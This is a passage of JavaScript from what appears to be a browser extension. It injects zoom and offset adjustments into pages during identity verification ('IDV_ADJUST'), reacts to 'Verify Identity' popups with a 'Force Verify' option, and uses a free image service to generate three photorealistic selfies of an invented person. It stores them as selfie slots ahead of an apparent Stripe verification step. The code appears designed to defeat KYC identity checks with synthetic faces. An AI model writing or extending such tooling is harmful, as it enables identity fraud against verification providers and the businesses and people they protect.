    ADJ.offY = Math.max(-300, Math.min(300, Math.round(startOffY + (e.clientY-startY)*s)))
    obsRender(); sendAdjust()
  })
  window.addEventListener('mouseup', () => { dragging = false; wrap.style.cursor = 'crosshair' })
  wrap.addEventListener('wheel', e => {
    e.preventDefault()
    ADJ.zoom = Math.max(0.5, Math.min(2.5, ADJ.zoom + (e.deltaY > 0 ? -0.05 : 0.05)))
    const sl = document.getElementById('adjZoom')
    if (sl) { sl.value = Math.round(ADJ.zoom*100); document.getElementById('adjZoomVal').textContent = sl.value+'%' }
    obsRender(); sendAdjust()
  }, { passive: false })
}

function setupAdjSlider(sliderId, valId, fmt, onChange) {
  const s = document.getElementById(sliderId), v = document.getElementById(valId)
  if (!s) return
  s.addEventListener('input', () => { v.textContent = fmt(s.value); onChange(s.value) })
}

function sendAdjust() {
  chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
    if (!tabs[0]?.id) return
    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id, allFrames: true }, world: 'MAIN',
      func: (z,x,y) => window.postMessage({ _idv:'IDV_ADJUST', zoom:z, offX:x, offY:y }, '*'),
      args: [ADJ.zoom, ADJ.offX, ADJ.offY]
    }).catch(() => {})
  })
}

function resetAdj() {
  ADJ.zoom = 1.08; ADJ.offX = 0; ADJ.offY = 0
  const sl = document.getElementById('adjZoom')
  if (sl) { sl.value = 108; document.getElementById('adjZoomVal').textContent = '108%' }
  obsRender(); sendAdjust()
}

// ── Auto-flow status bar ───────────────────────────────────────────────────────
let autoBarTimer = null
function showAutoBar(step, msg) {
  const bar = document.getElementById('autoBar')
  const txt = document.getElementById('autoMsg')
  if (!bar || !txt) return
  txt.textContent = msg
  bar.className = 'auto-bar visible'
  if (step === 'need_docs' || step === 'pgrr_wait' || step === 'discover_wait') bar.className = 'auto-bar visible warn'
  if (step === 'discharged') bar.className = 'auto-bar visible ok'
  if (step === 'pgrr_fail')  bar.className = 'auto-bar visible err'
  clearTimeout(autoBarTimer)
  // Auto-hide after 30s (except important states)
  if (!['need_docs','discharged','pgrr_fail'].includes(step)) {
    autoBarTimer = setTimeout(() => bar.classList.remove('visible'), 30000)
  }
}

// ── Modal alert (Verify Identity popup detected) ───────────────────────────────
function showModalAlert(store, reason) {
  const el  = document.getElementById('modalAlert')
  const sub = document.getElementById('modalAlertSub')
  if (!el) return
  sub.textContent = (store ? `Store: ${store} — ` : '') + (reason || 'Use Force Verify below')
  el.classList.add('visible')
  // Flash the main tab
  document.querySelector('.tab[data-tab="main"]')?.classList.add('tab-flash')
  setTimeout(() => document.querySelector('.tab[data-tab="main"]')?.classList.remove('tab-flash'), 2000)
}

document.getElementById('modalAlertClose')?.addEventListener('click', () => {
  document.getElementById('modalAlert')?.classList.remove('visible')
})

// ── AI Selfie Generator (Pollinations.ai — FREE, no API key) ─────────────────
async function generateOneSelfie(prompt, seed) {
  const encoded = encodeURIComponent(
    prompt + ', ultra realistic selfie photo, sharp focus, 4k, photorealistic, front facing'
  )
  const url = `https://image.pollinations.ai/prompt/${encoded}?width=512&height=640&nologo=true&seed=${seed}&model=flux`
  const res = await fetch(url)
  if (!res.ok) throw new Error('Generation failed: ' + res.status)
  const blob = await res.blob()
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload  = () => resolve(reader.result)
    reader.onerror = reject
    reader.readAsDataURL(blob)
  })
}

document.getElementById('btnGenSelfies')?.addEventListener('click', async () => {
  const btn    = document.getElementById('btnGenSelfies')
  const status = document.getElementById('aiStatus')
  const prompt = document.getElementById('aiPrompt')?.value?.trim()

  if (!prompt) {
    status.textContent = 'Enter a person description first'
    status.className = 'ai-status err'; return
  }

  btn.disabled = true
  const basePrompt = prompt
  const seeds = [Math.floor(Math.random()*99999), Math.floor(Math.random()*99999), Math.floor(Math.random()*99999)]
  const variations = [
    basePrompt + ', looking straight at camera, neutral expression',
    basePrompt + ', slight natural smile, soft indoor lighting',
    basePrompt + ', head slightly tilted, relaxed expression'
  ]

  const results = [null, null, null]

  for (let i = 0; i < 3; i++) {
    const slot = document.getElementById('aiSlot' + i)
    const img  = document.getElementById('aiImg' + i)
    slot.classList.add('loading')
    img.classList.remove('show')
    status.textContent = `Generating selfie ${i+1}/3… (free AI, may take 10–20s)`
    status.className = 'ai-status'
    try {
      const dataUrl = await generateOneSelfie(variations[i], seeds[i])
      results[i] = dataUrl
      img.src = dataUrl
      img.classList.add('show')
      slot.classList.remove('loading')
    } catch(e) {
      slot.classList.remove('loading')
      status.textContent = `Selfie ${i+1} failed: ` + e.message
      status.className = 'ai-status err'
      btn.disabled = false
      return
    }
  }

  // Save all 3 as selfie slots
  await chrome.storage.local.set({ selfie_0: results[0], selfie_1: results[1], selfie_2: results[2] })

  // Refresh selfie slot previews in the UI
  const slotKeys = ['S0','S1','S2']
  for (let i = 0; i < 3; i++) {
    const prev = document.getElementById('prevS' + i)
    const slotEl = document.getElementById('slot' + slotKeys[i])
    if (prev && results[i]) {
      prev.src = results[i]; prev.classList.add('show')
      slotEl?.classList.add('has-file')
      const lbl = slotEl?.querySelector('.doc-slot-label')
      if (lbl) lbl.textContent = '✓ AI Generated'
    }
  }

  status.textContent = '3 selfies generated and saved to slots!'
  status.className = 'ai-status ok'
  btn.disabled = false
  updateStripeButton()
})

// Wire up "Use as Slot N" buttons on AI preview slots
for (let i = 0; i < 3; i++) {
  document.getElementById('aiSlot' + i)?.addEventListener('click', async () => {
    const img = document.getElementById('aiImg' + i)
    if (!img.src || !img.classList.contains('show')) return
    const key = 'selfie_' + i
    await chrome.storage.local.set({ [key]: img.src })
    const prev  = document.getElementById('prevS' + i)
    const slotEl = document.getElementById('slot' + ['S0','S1','S2'][i])
    if (prev) { prev.src = img.src; prev.classList.add('show') }
    slotEl?.classList.add('has-file')
    const lbl = slotEl?.querySelector('.doc-slot-label')
    if (lbl) lbl.textContent = '✓ AI'
    updateStripeButton()
  })
}

// ── Start ─────────────────────────────────────────────────────────────────────
init()
